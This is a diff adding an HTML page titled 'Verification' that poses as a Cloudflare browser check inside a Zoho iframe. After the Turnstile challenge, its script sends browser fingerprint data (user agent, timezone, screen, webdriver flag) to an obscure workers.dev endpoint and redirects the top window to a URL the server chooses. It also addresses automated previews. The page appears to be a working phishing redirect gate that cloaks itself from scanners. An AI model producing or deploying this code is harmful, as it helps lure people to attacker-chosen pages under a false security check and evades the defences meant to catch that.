@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <meta charset="UTF-8">
+  <title>Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- Cloudflare Turnstile -->
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+  <style>
+    *{box-sizing:border-box;}
+
+    html, body{
+      margin:0;
+      padding:0;
+      height:70%;
+      font-family:"Segoe UI",system-ui,-apple-system,BlinkMacSystemFont,sans-serif;
+      background:#f3f3f3;
+    }
+
+    /* Wrapper makes sure content is centered in Zoho's iframe area */
+    .frame-wrap{
+      min-height:70vh;
+      width:100%;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:24px 8px;
+    }
+
+    .guard{
+      background:#fff;
+      width:100%;
+      max-width:420px;
+      padding:18px 26px;
+      border-radius:8px;
+      box-shadow:0 12px 28px rgba(0,0,0,.08);
+      text-align:center;
+      margin:0 auto; /* extra safety */
+    }
+
+    .guard h1{
+      font-size:18px;
+      margin:0 0 6px;
+      font-weight:600;
+    }
+    .guard p{
+      font-size:13px;
+      color:#666;
+      margin:0 0 18px;
+    }
+    .bot-preview{
+      font-size:12px;
+      color:#999;
+      margin-top:14px;
+    }
+
+    .cf-turnstile{
+      display:flex;
+      justify-content:center;
+    }
+  </style>
+
+
+
+  <div class="frame-wrap">
+    <div class="guard">
+      <h1>Checking your browser…</h1>
+      <p>Please complete the security check to continue.</p>
+
+      <!-- IMPORTANT: class, not id (Zoho requirement) -->
+      <div class="cf-turnstile"
+           data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"
+           data-callback="onHumanVerified">
+      </div>
+
+      <div class="bot-preview">
+        Automatic previews may show this page for security checks.<br>
+        No action is required.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function collectMetrics(){
+      try{
+        return {
+          ua: navigator.userAgent || "",
+          lang: navigator.language || "",
+          tz: (Intl.DateTimeFormat().resolvedOptions().timeZone || ""),
+          screen: (screen && screen.width && screen.height)
+                  ? (screen.width + "x" + screen.height) : "",
+          colorDepth: screen.colorDepth || 0,
+          webdriver: navigator.webdriver === true,
+          timing: (performance && performance.now) ? performance.now() : 0
+        };
+      }catch(e){
+        return {};
+      }
+    }
+
+    // xFrame-safe redirect: if inside Zoho iframe, redirect the TOP window
+    function redirectTo(url){
+      try {
+        if (window.top && window.top !== window.self) {
+          window.top.location.href = url;
+        } else {
+          window.location.href = url;
+        }
+      } catch(e){
+        window.location.href = url;
+      }
+    }
+
+    function onHumanVerified(cfToken){
+      if(!cfToken) return;
+
+      const GW_ENDPOINT =
+        "https://rapid-butterfly-1d9d.4a8daf702aff10f6401d506d.workers.dev/gw";
+
+      fetch(GW_ENDPOINT,{
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body: JSON.stringify({
+          cf_token: cfToken,
+          metrics: collectMetrics()
+        })
+      })
+      .then(r => r.json().catch(() => null))
+      .then(res => {
+        if(res && res.trust_token){
+          try{
+            sessionStorage.setItem("trust_token", res.trust_token);
+          }catch(e){}
+        }
+
+        if(res && typeof res.next === "string" && res.next.length > 8){
+          redirectTo(res.next);
+          return;
+        }
+
+        location.reload();
+      })
+      .catch(() => {
+        location.reload();
+      });
+    }
+  </script>
